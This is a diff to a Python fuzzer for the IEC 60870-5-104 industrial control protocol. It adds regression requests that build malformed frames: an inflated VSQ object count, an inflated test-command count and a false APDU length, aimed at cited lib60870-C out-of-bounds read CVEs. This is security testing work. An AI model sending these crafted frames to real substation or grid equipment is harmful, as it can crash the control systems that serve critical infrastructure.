@@ -1083,6 +1083,25 @@ class IEC104Fuzzer(StatefulFuzzer):
                 "attacks",
                 requires_state=CommonState.ANY,
             ),
+            # Real lib60870-C 2.4.0 parser CVEs (CISA ICSA-26-211-11).
+            RequestInfo(
+                "IEC104_VSQ_Overflow",
+                "VSQ object-count exceeds ASDU body OOB read (CVE-2026-63033)",
+                "attacks",
+                requires_state=CommonState.ANY,
+            ),
+            RequestInfo(
+                "IEC104_TestCommand_Overflow",
+                "TypeID 104 (C_TS_NA_1) inflated object-count OOB read (CVE-2026-61893)",
+                "attacks",
+                requires_state=CommonState.ANY,
+            ),
+            RequestInfo(
+                "IEC104_APDU_Length_Lie",
+                "I-format APDU length declares more/less than the real frame length",
+                "attacks",
+                requires_state=CommonState.ANY,
+            ),
             # IEC 62351 Authentication fuzzing
             RequestInfo(
                 "IEC104_IEC62351_Auth",
@@ -1208,6 +1227,10 @@ class IEC104Fuzzer(StatefulFuzzer):
 
         # Attack patterns
         self._add_attack_patterns()
+
+        # Real lib60870-C parser CVE regression requests (always advertised;
+        # gated per-group so --enable/--disable can target each individually).
+        self._add_cve_regression_requests()
 
         # File transfer / vendor / auth groups are opt-in via config flags, but an
         # explicit `--enable <group>` whitelist must also pull them in (otherwise the
@@ -2099,6 +2122,135 @@ class IEC104Fuzzer(StatefulFuzzer):
                 ),
             )
         )
+
+    def _add_cve_regression_requests(self):
+        """Real lib60870-C 2.4.0 parser crashes (CISA ICSA-26-211-11).
+
+        These target server-side ASDU parsing paths that the general ASDU
+        corpus does not systematically reach:
+
+        - CVE-2026-63033 (CWE-125): an I-format ASDU whose VSQ object-count is
+          declared larger than the ASDU body actually holds, so
+          InformationObject_ParseObjectAddress reads past the buffer.
+        - CVE-2026-61893 (CWE-125): TypeID 104 (C_TS_NA_1, test command) with
+          an inflated object count, so TestCommand_getFromBuffer over-reads.
+
+        Also closes an audit gap: create_apci_i_format_header() derives the
+        APCI length from a Size() over asdu_block (math=x+4) that AUTO-CORRECTS,
+        and the U/S-format length bytes are fuzzable=False, so the shared ASDU
+        corpus can never desync the APDU length. IEC104_APDU_Length_Lie is a
+        dedicated request that makes the I-format APDU length an explicit
+        boundary field able to declare MORE or LESS than the real frame length,
+        without perturbing the valid-frame corpus the stateful I/S/U flow relies
+        on. It mirrors the bad_length=0xFF length-lie in IEC104_Attack_Patterns.
+
+        Each request is gated by its own advertised group so --enable/--disable
+        can target it in isolation.
+        """
+        common_address = self.config.get_option("common_address", 1)
+
+        # VSQ object-count declared larger than the body holds (CVE-2026-63033).
+        # The APCI length auto-corrects to the true body size, so the frame is
+        # well-formed at the APCI layer and the ASDU parser is reached; only the
+        # VSQ lies. One 4-byte single-point object is present while the VSQ
+        # claims up to 0x7F objects (both SQ=0 and SQ=1 encodings).
+        if self.is_request_enabled("IEC104_VSQ_Overflow"):
+            self.session.connect(
+                Request(
+                    "IEC104_VSQ_Overflow",
+                    children=(
+                        create_apci_i_format_header("apci"),
+                        Block(
+                            "asdu_block",
+                            children=(
+                                Byte("type_id", ASDU_Types.M_SP_NA_1, fuzzable=False),
+                                Group(
+                                    "vsq_count",
+                                    values=[
+                                        bytes([n]) for n in (0x02, 0x05, 0x0F, 0x7F, 0x82, 0xFF)
+                                    ],
+                                ),
+                                Word(
+                                    "cot",
+                                    CauseOfTransmission.SPONTANEOUS,
+                                    endian="<",
+                                    fuzzable=False,
+                                ),
+                                Word("ca", common_address, endian="<", fuzzable=False),
+                                create_info_object_single_point(0x000001, 0x01),
+                            ),
+                        ),
+                    ),
+                )
+            )
+
+        # TypeID 104 (C_TS_NA_1) with an inflated object count (CVE-2026-61893).
+        # One test-command info object is present while the VSQ over-declares,
+        # so TestCommand_getFromBuffer walks past the ASDU body.
+        if self.is_request_enabled("IEC104_TestCommand_Overflow"):
+            self.session.connect(
+                Request(
+                    "IEC104_TestCommand_Overflow",
+                    children=(
+                        create_apci_i_format_header("apci"),
+                        Block(
+                            "asdu_block",
+                            children=(
+                                Byte("type_id", ASDU_Types.C_TS_NA_1, fuzzable=False),
+                                Group(
+                                    "vsq_count",
+                                    values=[
+                                        bytes([n]) for n in (0x02, 0x05, 0x0F, 0x7F, 0x82, 0xFF)
+                                    ],
+                                ),
+                                Word(
+                                    "cot",
+                                    CauseOfTransmission.ACTIVATION,
+                                    endian="<",
+                                    fuzzable=False,
+                                ),
+                                Word("ca", common_address, endian="<", fuzzable=False),
+                                create_info_object_test_command(0x000000, 0x55AA),
+                            ),
+                        ),
+                    ),
+                )
+            )
+
+        # I-format APDU length lie: declare more or less than the real frame
+        # length. The real length of this frame is control(4) + asdu_header(6) +
+        # single-point object(4) = 0x0E; the Group emits under-, at-, over- and
+        # illegal (> 253) boundary values. The seq words and ASDU stay valid so
+        # the desync is isolated to the length octet.
+        if self.is_request_enabled("IEC104_APDU_Length_Lie"):
+            self.session.connect(
+                Request(
+                    "IEC104_APDU_Length_Lie",
+                    children=(
+                        Static("start", b"\x68"),
+                        Group(
+                            "apdu_length",
+                            values=[
+                                bytes([n])
+                                for n in (0x00, 0x01, 0x04, 0x0D, 0x0F, 0x40, 0x7F, 0xFE, 0xFF)
+                            ],
+                        ),
+                        Word("send_seq", 0, endian="<", fuzzable=False),
+                        Word("recv_seq", 0, endian="<", fuzzable=False),
+                        Block(
+                            "asdu_block",
+                            children=(
+                                create_asdu_header(
+                                    ASDU_Types.M_SP_NA_1,
+                                    cot=CauseOfTransmission.SPONTANEOUS,
+                                    ca=common_address,
+                                ),
+                                create_info_object_single_point(0x000001, 0x01),
+                            ),
+                        ),
+                    ),
+                )
+            )
 
     def _add_file_transfer_patterns(self):
         """Add comprehensive file transfer ASDU patterns (IEC104_File_Transfer)."""
